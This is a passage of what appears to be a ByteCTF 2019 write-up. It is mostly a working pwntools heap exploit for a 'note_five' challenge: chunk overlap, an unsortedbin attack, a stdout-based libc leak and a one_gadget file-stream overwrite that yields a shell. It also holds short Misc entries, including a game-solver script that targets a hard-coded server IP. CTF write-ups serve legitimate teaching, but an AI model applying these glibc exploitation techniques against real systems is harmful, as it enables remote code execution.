<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="mi">9999</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">p</span>
    <span class="k">if</span> <span class="n">host</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">"./note_five"</span><span class="p">)</span>
        <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x98</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0xa8</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0x1e8</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0xe8</span><span class="p">)</span>

    <span class="n">dele</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">dele</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">dele</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">dele</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

    <span class="c1">#overlap</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xe8</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x1f8</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mh">0xe8</span><span class="p">)</span>
    <span class="n">dele</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s2">"A"</span><span class="o">*</span><span class="mh">0xf0</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1f0</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">dele</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xe8</span><span class="p">)</span>

    <span class="c1"># t = int(raw_input('guest: '))</span>
    <span class="n">t</span> <span class="o">=</span> <span class="mi">8</span>
    <span class="n">global_maxfast</span> <span class="o">=</span> <span class="p">(</span><span class="n">t</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7f8</span>

    <span class="n">stdout</span> <span class="o">=</span> <span class="n">global_maxfast</span><span class="o">-</span><span class="mh">0x11d8</span>
    <span class="c1">#unsortedbin attack</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p16</span><span class="p">(</span><span class="n">global_maxfast</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0x1f8</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s2">"A"</span><span class="o">*</span><span class="mh">0x1f8</span><span class="o">+</span><span class="s1">'</span><span class="se">\xf1</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="o">*</span><span class="mh">0x98</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xf1</span><span class="p">)</span><span class="o">+</span><span class="n">p16</span><span class="p">(</span><span class="n">stdout</span><span class="o">-</span><span class="mh">0x51</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">dele</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">dele</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>

    <span class="n">dele</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x2e8</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="s2">"A"</span><span class="o">*</span><span class="mh">0x1f8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xf1</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\xa0\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">dele</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

    <span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xe8</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0xe8</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mh">0xe8</span><span class="p">)</span>
    <span class="c1">#leak libc</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="s1">'A'</span><span class="o">+</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="o">*</span><span class="mh">0x40</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="s1">'</span><span class="se">\x00\n</span><span class="s1">'</span><span class="p">)</span>

    <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>

    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span><span class="o">-</span><span class="mh">0x3c5600</span>
    <span class="n">info</span><span class="p">(</span><span class="s2">"libc : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>

    <span class="n">one_gadget</span> <span class="o">=</span> <span class="mh">0xf1147</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x3c55e0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x3c5600</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="n">payload</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="c1">#trigger abort--&gt;flush</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1000</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./libc.so"</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="c1"># elf = ELF("./mheap",checksec=False)</span>
    <span class="n">main</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="s1">'REMOTE'</span><span class="p">])</span>
</pre></div>
<h1 data-content="1" id="8d7fc61d975de0f867bd7adba877f69d">Misc</h1>
<h2 data-content="1" id="f23d93bd0fec701a807a898c0e5fbe1a">Hello Bytectf</h2>
<p>签到题：bytectf{Hello Bytectf}</p>
<h2 data-content="1" id="f0ba1ffb0a5a34fc056cc051d8c05381">jigsaw</h2>
<p>拼图游戏</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190909124314-557ac8ba-d2bc-1.jpg"/></p>
<h2 data-content="1" id="2b5415ed413f09720f9330fb08ed3e92">betgame</h2>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">"112.125.25.81"</span><span class="p">,</span><span class="mi">9999</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exp</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">y</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">y</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="s2">"s"</span><span class="p">:</span>
            <span class="k">return</span> <span class="s2">"b"</span>
        <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="s2">"j"</span><span class="p">:</span>
            <span class="k">return</span> <span class="s2">"s"</span>
        <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="s2">"b"</span><span class="p">:</span>
            <span class="k">return</span> <span class="s2">"j"</span>
    <span class="k">elif</span> <span class="n">y</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="s2">"s"</span><span class="p">:</span>
            <span class="k">return</span> <span class="s2">"j"</span>
        <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="s2">"b"</span><span class="p">:</span>
            <span class="k">return</span> <span class="s2">"s"</span>
        <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="s2">"j"</span><span class="p">:</span>
            <span class="k">return</span> <span class="s2">"b"</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">a</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">30</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"I will use:"</span><span class="p">)</span>
    <span class="n">tmp</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">info</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">i</span><span class="o">%</span><span class="mi">3</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span><span class="mi">0</span><span class="p">))</span>
    <span class="k">elif</span> <span class="n">i</span><span class="o">%</span><span class="mi">3</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
</div>
</div>